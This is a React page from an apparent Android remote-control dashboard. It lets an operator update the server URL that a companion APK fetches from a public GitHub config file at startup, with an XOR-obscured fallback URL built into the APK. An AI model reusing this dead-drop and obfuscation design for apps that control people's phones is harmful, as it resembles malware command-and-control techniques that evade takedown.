'use client'
import { useState, useEffect } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { Server, RefreshCw, CheckCircle, AlertCircle, ExternalLink, Shield } from 'lucide-react'

interface ConfigState {
  serverUrl: string
  version: number
  sha: string
}

export default function ServerConfigPage() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()

  const [config, setConfig]         = useState<ConfigState | null>(null)
  const [loading, setLoading]       = useState(true)
  const [saving, setSaving]         = useState(false)
  const [inputUrl, setInputUrl]     = useState('')
  const [result, setResult]         = useState<{ ok: boolean; msg: string; commit?: string } | null>(null)

  const fetchConfig = async () => {
    setLoading(true)
    try {
      const res = await fetch('/api/server-config')
      const d   = await res.json()
      if (res.ok) {
        setConfig(d)
        setInputUrl(d.serverUrl)
      }
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => { fetchConfig() }, [])

  const handleSave = async () => {
    if (!inputUrl.startsWith('http')) {
      setResult({ ok: false, msg: 'URL harus diawali https://' })
      return
    }
    setSaving(true)
    setResult(null)
    try {
      const res = await fetch('/api/server-config', {
        method:  'PUT',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ serverUrl: inputUrl }),
      })
      const d = await res.json()
      if (res.ok) {
        setResult({ ok: true, msg: `Berhasil update ke v${d.version}`, commit: d.commit })
        await fetchConfig()
      } else {
        setResult({ ok: false, msg: d.error ?? 'Gagal update' })
      }
    } catch {
      setResult({ ok: false, msg: 'Network error' })
    } finally {
      setSaving(false)
    }
  }

  const changed = config && inputUrl.trim().replace(/\/$/, '') !== config.serverUrl

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-2xl mx-auto px-4 py-4 md:py-6">

          <div className="mb-5">
            <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
              <Server size={20} className="text-android-green" />
              Server Config
            </h2>
            <p className="text-android-muted text-xs mt-1">
              Update server URL APK tanpa rebuild — APK baca config ini setiap startup.
            </p>
          </div>

          {/* How it works */}
          <div className="grid grid-cols-3 gap-2 mb-5">
            {[
              { step: '1', label: 'Edit URL',       sub: 'Di halaman ini',      color: 'text-android-blue' },
              { step: '2', label: 'Push GitHub',    sub: 'android-config.json', color: 'text-android-yellow' },
              { step: '3', label: 'APK Pakai URL',  sub: 'Startup berikutnya',  color: 'text-android-green' },
            ].map(({ step, label, sub, color }) => (
              <div key={step} className="bg-android-surface border border-android-border rounded-xl p-3 text-center">
                <div className={`text-lg font-bold ${color} mb-1`}>{step}</div>
                <p className="text-white text-[11px] font-semibold">{label}</p>
                <p className="text-android-muted text-[10px]">{sub}</p>
              </div>
            ))}
          </div>

          {/* Current Config Card */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-4">
            <div className="flex items-center justify-between mb-3">
              <p className="text-xs font-bold text-android-muted uppercase tracking-wider">Config Saat Ini</p>
              <button
                onClick={fetchConfig}
                disabled={loading}
                className="p-1.5 rounded-lg hover:bg-white/5 text-android-muted hover:text-android-text transition-colors disabled:opacity-40"
              >
                <RefreshCw size={13} className={loading ? 'animate-spin' : ''} />
              </button>
            </div>

            {loading ? (
              <div className="space-y-2">
                <div className="h-4 bg-android-border rounded animate-pulse" />
                <div className="h-3 bg-android-border rounded w-1/2 animate-pulse" />
              </div>
            ) : config ? (
              <div className="space-y-2">
                <div className="flex items-center gap-2 bg-[#0a0c10] border border-android-border rounded-lg px-3 py-2.5">
                  <div className="w-2 h-2 rounded-full bg-android-green shrink-0" />
                  <code className="text-android-green text-xs font-mono flex-1 break-all">{config.serverUrl}</code>
                  <a
                    href={config.serverUrl}
                    target="_blank"
                    rel="noreferrer"
                    className="text-android-muted hover:text-android-text shrink-0"
                  >
                    <ExternalLink size={12} />
                  </a>
                </div>
                <div className="flex gap-3 text-[10px] text-android-muted font-mono">
                  <span>v{config.version}</span>
                  <span className="text-android-border">·</span>
                  <span>SHA {config.sha.substring(0, 12)}…</span>
                </div>
              </div>
            ) : (
              <p className="text-android-red text-xs">Gagal load config</p>
            )}
          </div>

          {/* Edit Card */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-4">
            <p className="text-xs font-bold text-android-muted uppercase tracking-wider mb-3">Update Server URL</p>

            <div className="space-y-3">
              <div>
                <label className="text-[10px] font-mono text-android-green/70 uppercase tracking-wider">
                  Server URL Baru
                </label>
                <input
                  value={inputUrl}
                  onChange={e => { setInputUrl(e.target.value); setResult(null) }}
                  placeholder="https://your-server.netlify.app"
                  className="mt-1.5 w-full bg-[#0a0c10] border border-android-border rounded-lg px-3 py-2.5 text-sm text-android-text font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/50 transition-colors"
                />
                <p className="text-[10px] text-android-muted mt-1">
                  Tanpa trailing slash. Contoh: <code className="text-android-green">https://iwx-android-control.netlify.app</code>
                </p>
              </div>

              {result && (
                <div className={`flex items-start gap-2 p-3 rounded-lg text-xs border ${
                  result.ok
                    ? 'bg-android-green/10 border-android-green/30 text-android-green'
                    : 'bg-android-red/10 border-android-red/30 text-android-red'
                }`}>
                  {result.ok
                    ? <CheckCircle size={13} className="shrink-0 mt-0.5" />
                    : <AlertCircle size={13} className="shrink-0 mt-0.5" />}
                  <div>
                    <p className="font-medium">{result.msg}</p>
                    {result.commit && (
                      <p className="text-[10px] mt-0.5 opacity-80 font-mono">
                        Commit: {result.commit} · APK baca URL baru saat startup berikutnya
                      </p>
                    )}
                  </div>
                </div>
              )}

              <button
                onClick={handleSave}
                disabled={saving || !changed || loading}
                className="w-full py-2.5 rounded-lg text-sm font-semibold transition-all flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 enabled:active:scale-95"
              >
                {saving ? (
                  <>
                    <RefreshCw size={14} className="animate-spin" />
                    Pushing ke GitHub…
                  </>
                ) : (
                  <>
                    <Server size={14} />
                    {changed ? 'Simpan & Push ke GitHub' : 'Tidak ada perubahan'}
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Info box */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4">
            <p className="text-xs font-bold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <Shield size={13} /> Cara Kerja
            </p>
            <div className="space-y-2 text-[11px] text-android-muted">
              <div className="flex gap-2">
                <span className="text-android-green font-bold shrink-0">→</span>
                <span>APK fetch <code className="text-android-text font-mono">android-config.json</code> dari GitHub raw setiap kali service start (max 6 detik timeout).</span>
              </div>
              <div className="flex gap-2">
                <span className="text-android-green font-bold shrink-0">→</span>
                <span>Jika fetch berhasil, APK pakai URL dari config. Jika gagal (offline), fallback ke URL default yang di-XOR encrypt di dalam APK.</span>
              </div>
              <div className="flex gap-2">
                <span className="text-android-green font-bold shrink-0">→</span>
                <span>Update di sini langsung commit ke GitHub — tidak perlu rebuild APK, tidak perlu reinstall.</span>
              </div>
              <div className="mt-2 p-2.5 bg-android-bg border border-android-border rounded-lg">
                <p className="text-android-text font-mono text-[10px] break-all">
                  raw.githubusercontent.com/Kztutorial99/AndroidControl/main/android-config.json
                </p>
              </div>
            </div>
          </div>

        </div>
      </main>
    </div>
  )
}
